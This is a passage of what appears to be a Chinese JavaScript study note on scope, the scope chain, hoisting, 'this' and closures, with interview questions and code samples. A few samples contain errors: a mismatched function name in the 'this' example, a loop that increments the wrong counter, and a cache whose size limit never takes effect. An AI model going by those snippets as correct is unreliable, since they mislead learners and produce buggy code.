<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> blogName = <span class="string">"浪里行舟"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerSay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(blogName);</span><br><span class="line">  &#125;</span><br><span class="line">  innerSay();</span><br><span class="line">&#125;</span><br><span class="line">alert(blogName); <span class="comment">//脚本错误</span></span><br><span class="line">innerSay(); <span class="comment">//脚本错误</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>块级作用域<br>使用let、const关键创建块级作用域.<br>在函数内部或代码块中创建</p>
</li>
</ul>
<ol>
<li><p>作用域有上下级关系，上下级关系具体看函数在哪个作用域下创建的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">var</span> c = <span class="number">200</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fn2</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="number">2000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// “fn作用域” 是 “fn2作用域” 的上级</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>作用域的用处：隔离变量，不同作用域下的同名变量不会有冲突。</p>
</li>
<li><p>作用域是分层的，内层作用域可以访问外层作用域的变量，反之则不行。<br><img src="../images/other/other-scope-level.png" title="作用域分层"><br>最后输出的结果为 2, 4, 12<br> 泡泡 1 是全局作用域，有标识符 foo；<br> 泡泡 2 是函数作用域 foo，有标识符 a,bar,b；<br> 泡泡 3 是函数作用域 bar，仅有标识符 c。</p>
</li>
<li><p>块语句，如if、switch、for等不像函数，不会创建新的作用域。块语句中定义的变量将保留在它们已经存在的作用域中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// 'if' 条件语句块不会创建一个新的作用域</span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">'Hammad'</span>; <span class="comment">// name 依然在全局作用域中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">// logs 'Hammad'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><ol>
<li><p>自由变量：当前作用域中没有定义的变量</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">200</span></span><br><span class="line">  <span class="built_in">console</span>.log(a) <span class="comment">// 这里的a在这里就是一个自由变量</span></span><br><span class="line">  <span class="built_in">console</span>.log(b)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>
</li>
<li><p>自由变量使用时如何查找呢？向父级作用域（创建这个函数的那个域）查找，父级没有，再一层一层向上查找，知道window对象。这种一层一层的关系就叫做作用域链。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">200</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="number">300</span></span><br><span class="line">    <span class="built_in">console</span>.log(a) <span class="comment">// 自由变量，顺着作用域链向父作用域找</span></span><br><span class="line">    <span class="built_in">console</span>.log(b) <span class="comment">// 自由变量，顺着作用域链向父作用域找</span></span><br><span class="line">    <span class="built_in">console</span>.log(c) <span class="comment">// 本作用域的变量</span></span><br><span class="line">  &#125;</span><br><span class="line">  F2()</span><br><span class="line">&#125;</span><br><span class="line">F1()</span><br></pre></td></tr></table></figure>
</li>
<li><p>自由变量的取值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">20</span></span><br><span class="line">  f() <span class="comment">// 10，而不是20</span></span><br><span class="line">&#125;</span><br><span class="line">show(fn)</span><br></pre></td></tr></table></figure>
<p>问：在 fn 函数中，取自由变量 x 的值时，要到哪个作用域中取？<br>答：要到创建 fn 函数的那个作用域中取，无论 fn 函数将在哪里调用。</p>
</li>
</ol>
<h3 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a>执行上下文</h3><ol>
<li>范围：一段 <code>&lt;script&gt;</code> 或 一个函数</li>
<li>全局：变量定义、函数声明</li>
<li>函数：变量定义、函数声明、<code>this</code>、<code>arguments</code></li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 后面的 var a 实际上会在此处先生成一段 var a = undefined;</span></span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn(<span class="string">'zhangsan'</span>); <span class="comment">// zhangsan 18</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 后面的 var age 实际上会提前执行，先在此处生成一段 var age = undefined;</span></span><br><span class="line">  age = <span class="number">18</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(name, age);</span><br><span class="line">  <span class="keyword">var</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>变量、函数声明默认会提前（变量提升），函数表示式不会提前。在函数内部的变量、函数同样也会提前。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn1(); <span class="comment">// 此处调用，可以正常执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">fn1(); <span class="comment">// 此处调用，也可以正常执行。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn2(); <span class="comment">// 放在前面执行会报错</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">fn2(); <span class="comment">// 对于函数表达式，应该放在后面执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fn2() 放在前面执行的流程如下：</span></span><br><span class="line"><span class="comment">// 在顶部会生成一个 var fn2 = undefined;</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="literal">undefined</span>;</span><br><span class="line">fn2(); <span class="comment">// 执行相当于执行undefined，所以会报错</span></span><br><span class="line">fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p><code>this</code> 要在执行时才能确认值，定义时无法确认值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  name: <span class="string">'A'</span>,</span><br><span class="line">  fn: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.fn(); <span class="comment">// this === a</span></span><br><span class="line">a.fn.call(&#123;<span class="attr">name</span>: <span class="string">'B'</span>&#125;); <span class="comment">// this === &#123;name: 'B'&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn2 = a.fn;</span><br><span class="line">fn1(); <span class="comment">// this === window</span></span><br></pre></td></tr></table></figure></p>
<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><ol>
<li><p>函数作为返回值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个函数，函数作为返回值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// a是自由变量，父作用域（申明时的作用域，而不是执行时的作用域）的查找</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">f1(); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>函数作为参数传递</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个函数，函数作为返回值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// a是自由变量，父作用域的查找</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F2</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">  fn(); <span class="comment">// 100;</span></span><br><span class="line">&#125;</span><br><span class="line">F2(f1); <span class="comment">// 将 f1 作为参数传给 F2</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="面试题：变量提升"><a href="#面试题：变量提升" class="headerlink" title="面试题：变量提升"></a>面试题：变量提升</h3><p>定义变量、函数时，会默认提到当前作用域的最前面</p>
<h3 id="面试题：this的作用"><a href="#面试题：this的作用" class="headerlink" title="面试题：this的作用"></a>面试题：this的作用</h3><ol>
<li>作为构造函数执行</li>
<li>作为对象属性执行</li>
<li>作为普通函数执行</li>
<li>call apply bind</li>
</ol>
<h3 id="面试题：创建10个a标签，点击的时候弹出序号"><a href="#面试题：创建10个a标签，点击的时候弹出序号" class="headerlink" title="面试题：创建10个a标签，点击的时候弹出序号"></a>面试题：创建10个a标签，点击的时候弹出序号</h3><p>常规的思路（<strong>错误</strong>）：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i, a;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.innerHTML = i + <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">  a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    alert(i);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解析：绑定的事件是在后续的时候执行的，因为 i 是一个自由变量，依托的是全局作用域，此时 i 早已变成 10了，所以无论点击哪一个弹出来的都是10</p>
<p><strong>正确</strong>写法（使用自执行函数）：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">    a.innerHTML = i + <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">      alert(i);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解析：使用一个自执行函数，将 i 从全局作用域变成了函数作用域，达到输出当前 i 的目的。</p>
<h3 id="面试题：如何理解作用域"><a href="#面试题：如何理解作用域" class="headerlink" title="面试题：如何理解作用域"></a>面试题：如何理解作用域</h3><ol>
<li>自由变量（函数内的变量是函数作用域，函数外的变量是全局作用域）</li>
<li>作用域链，即自由变量如何查找</li>
<li>闭包的2个使用场景</li>
</ol>
<h3 id="面试题：实际开发中闭包的使用"><a href="#面试题：实际开发中闭包的使用" class="headerlink" title="面试题：实际开发中闭包的使用"></a>面试题：实际开发中闭包的使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 闭包在实际应用中主要用于封装变量、收敛权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isFirstLoad</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _list = []; <span class="comment">// 变量_list被封装了，在外部无法获取到该变量</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123; <span class="comment">// 使用函数将id的作用域变成函数作用域</span></span><br><span class="line">    <span class="keyword">if</span> (_list.indexOf(id) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _list.push(id);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> firstLoad = isFirstLoad();</span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// true;</span></span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// false</span></span><br><span class="line">firstLoad(<span class="number">20</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="闭包-1"><a href="#闭包-1" class="headerlink" title="闭包"></a>闭包</h2><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>简单的说，Javascript允许使用内部函数（即函数定义和函数表达式位于另一个函数的函数体内）访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ul>
<li><p>Demo1</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func(<span class="number">1</span>)(<span class="number">2</span>) = <span class="number">3</span></span><br><span class="line">func(<span class="number">3</span>)(<span class="number">5</span>) = <span class="number">8</span></span><br><span class="line">由上例推导函数主体</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">num1</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">num2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Demo2</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置移动端基准字号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeSizer</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.style.fontSize = size + <span class="string">'px'</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> size12 = makeSizer(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> size14 = makeSizer(<span class="number">14</span>);</span><br><span class="line"><span class="keyword">var</span> size16 = makeSizer(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如设置按钮点击时调用</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-12'</span>).onclick = size12;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-14'</span>).onclick = size14;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'size-16'</span>).onclick = size16;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h3><ul>
<li><p>匿名自执行函数<br>我们知道所有的变量，如果不加上var关键字，则默认的会添加到全局对象的属性上去，这样的临时变量加入全局对象有很多坏处，<br>比如：别的函数可能误用这些变量；造成全局对象过于庞大，影响访问速度（因为变量的取值是需要从原型链上遍历的）。<br>除了每次使用变量都是用var关键字外，我们在实际情况下经常遇到这样一种情况，即有的函数只需要执行一次，其内部变量无需维护，<br>比如UI的初始化，那么我们可以使用闭包：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data= &#123;    </span><br><span class="line">  table : [],    </span><br><span class="line">  tree : &#123;&#125;    </span><br><span class="line">&#125;;    </span><br><span class="line">     </span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">dm</span>)</span>&#123;    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; dm.table.rows; i++)&#123;    </span><br><span class="line">    <span class="keyword">var</span> row = dm.table.rows[i];    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; row.cells; i++)&#123;    </span><br><span class="line">       drawCell(i, j);    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;)(data);</span><br></pre></td></tr></table></figure>
<p>我们创建了一个匿名的函数，并立即执行它，由于外部无法引用它内部的变量，因此在函数执行完后会立刻释放资源，关键是不污染全局对象。</p>
</li>
<li><p>结果缓存<br>我们开发中会碰到很多情况，设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，<br>那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CachedSearchBox = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">  <span class="keyword">var</span> cache = &#123;&#125;,    </span><br><span class="line">      count = [];    </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    attachSearchBox: <span class="function"><span class="keyword">function</span>(<span class="params">dsid</span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span>(dsid <span class="keyword">in</span> cache)&#123;<span class="comment">//如果结果在缓存中    </span></span><br><span class="line">        <span class="keyword">return</span> cache[dsid];<span class="comment">//直接返回缓存中的对象    </span></span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">var</span> fsb = <span class="keyword">new</span> uikit.webctrl.SearchBox(dsid);<span class="comment">//新建    </span></span><br><span class="line">      cache[dsid] = fsb;<span class="comment">//更新缓存    </span></span><br><span class="line">      <span class="keyword">if</span>(count.length &gt; <span class="number">100</span>)&#123;<span class="comment">//保正缓存的大小&lt;=100    </span></span><br><span class="line">        <span class="keyword">delete</span> cache[count.shift()];    </span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">return</span> fsb;          </span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    clearSearchBox: <span class="function"><span class="keyword">function</span>(<span class="params">dsid</span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span>(dsid <span class="keyword">in</span> cache)&#123;    </span><br><span class="line">        cache[dsid].clearSelection();      </span><br><span class="line">      &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;;    </span><br><span class="line">&#125;)();    </span><br><span class="line">     </span><br><span class="line">CachedSearchBox.attachSearchBox(<span class="string">"input"</span>);</span><br></pre></td></tr></table></figure>
<p>这样我们在第二次调用的时候，就会从缓存中读取到该对象。</p>
</li>
<li><p>封装代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">  <span class="comment">//变量作用域为函数内部，外部无法访问    </span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"default"</span>;       </span><br><span class="line">     </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">return</span> name;    </span><br><span class="line">    &#125;,    </span><br><span class="line">    setName: <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>) </span>&#123;    </span><br><span class="line">      name = newName;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;();    </span><br><span class="line">     </span><br><span class="line">print(person.name);<span class="comment">//直接访问，结果为undefined    </span></span><br><span class="line">print(person.getName());    </span><br><span class="line">person.setName(<span class="string">"abruzzi"</span>);    </span><br><span class="line">print(person.getName());    </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">得到结果如下：   </span><br><span class="line"><span class="comment">// undefined  </span></span><br><span class="line"><span class="comment">// default  </span></span><br><span class="line"><span class="comment">// abruzzi</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>实现类和继承</p>
